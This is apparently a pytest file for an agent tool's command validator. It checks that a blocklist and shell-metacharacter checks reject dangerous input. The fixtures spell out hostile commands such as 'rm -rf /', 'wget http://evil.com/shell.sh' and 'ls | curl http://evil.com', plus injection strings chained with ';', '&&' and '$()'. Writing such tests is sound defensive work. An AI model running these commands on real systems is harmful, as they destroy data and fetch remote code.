"""Tests for execute_command_tool — command injection prevention (fixes #714)."""

import pytest

from aden_tools.tools.file_system_toolkits.execute_command_tool.execute_command_tool import (
    _validate_command,
)


class TestValidateCommand:
    """Tests for _validate_command() blocklist and injection detection."""

    # ---------- Safe commands ----------

    def test_safe_echo_command(self):
        """Simple echo command is allowed."""
        args = _validate_command("echo hello world")
        assert args[0] == "echo"
        assert "hello" in args

    def test_safe_ls_command(self):
        """Simple ls / dir command is allowed."""
        args = _validate_command("ls -la")
        assert args[0] == "ls"

    def test_safe_cat_command(self):
        """cat command is allowed."""
        args = _validate_command("cat file.txt")
        assert args[0] == "cat"

    def test_safe_grep_command(self):
        """grep command is allowed."""
        args = _validate_command("grep -r pattern .")
        assert args[0] == "grep"

    # ---------- Blocked commands ----------

    def test_rm_blocked(self):
        """rm command is blocked."""
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("rm -rf /")

    def test_curl_blocked(self):
        """curl (network access) is blocked."""
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("curl http://evil.com")

    def test_wget_blocked(self):
        """wget (network access) is blocked."""
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("wget http://evil.com/shell.sh")

    def test_shutdown_blocked(self):
        """shutdown is blocked."""
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("shutdown -h now")

    def test_sudo_blocked(self):
        """sudo (privilege escalation) is blocked."""
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("sudo ls")

    def test_python_blocked(self):
        """python interpreter is blocked."""
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("python -c 'import os; os.system(\"id\")'")

    def test_bash_blocked(self):
        """bash shell is blocked."""
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("bash -c 'echo pwned'")

    def test_windows_exe_extension_blocked(self):
        """Windows .exe extension is stripped before blocklist check."""
        with pytest.raises(ValueError, match="not allowed"):
            _validate_command("curl.exe http://evil.com")

    # ---------- Shell metacharacter injection ----------

    def test_semicolon_injection_blocked(self):
        """Command chaining with semicolons is blocked."""
        with pytest.raises(ValueError, match="metacharacters"):
            _validate_command("echo hello; rm -rf /")

    def test_pipe_injection_blocked(self):
        """Pipe injection is blocked."""
        with pytest.raises(ValueError, match="metacharacters"):
            _validate_command("ls | curl http://evil.com")

    def test_ampersand_injection_blocked(self):
        """Background execution with & is blocked."""
        with pytest.raises(ValueError, match="metacharacters"):
            _validate_command("echo hello & rm -rf /")

    def test_double_ampersand_injection_blocked(self):
        """&& chaining is blocked."""
        with pytest.raises(ValueError, match="metacharacters"):
            _validate_command("echo hello && rm -rf /")

    def test_backtick_injection_blocked(self):
        """Backtick command substitution is blocked."""
        with pytest.raises(ValueError, match="metacharacters"):
            _validate_command("echo `whoami`")

    def test_dollar_paren_injection_blocked(self):
        """$() command substitution is blocked."""
        with pytest.raises(ValueError, match="metacharacters"):
            _validate_command("echo $(whoami)")

    # ---------- Edge cases ----------

    def test_empty_command_rejected(self):
        """Empty command is rejected."""
        with pytest.raises(ValueError, match="empty"):
            _validate_command("")

    def test_whitespace_only_rejected(self):
        """Whitespace-only command is rejected."""
        with pytest.raises(ValueError, match="empty"):
            _validate_command("   ")

    def test_blocked_command_as_argument(self):
        """Blocked commands appearing as arguments are also rejected."""
        with pytest.raises(ValueError, match="blocked command"):
            _validate_command("xargs rm")
